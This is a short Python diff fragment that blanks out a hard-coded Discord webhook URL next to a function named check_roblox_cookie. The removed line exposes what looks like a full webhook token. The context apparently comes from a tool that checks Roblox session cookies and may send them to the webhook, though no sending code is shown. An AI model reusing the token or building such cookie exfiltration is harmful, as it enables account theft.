@@ -3,7 +3,7 @@ import os
 import json
 
 # Discord webhook URL
-WEBHOOK_URL = "https://discord.com/api/webhooks/1342257667514830959/Ipyos2tZL9kgjm1JaLivXdso5zLgEHEsal79EtxaVa43KbVPrn9e4c_pEHzEu3skWPQq"
+WEBHOOK_URL = ""
 
 def check_roblox_cookie(cookie):
     """
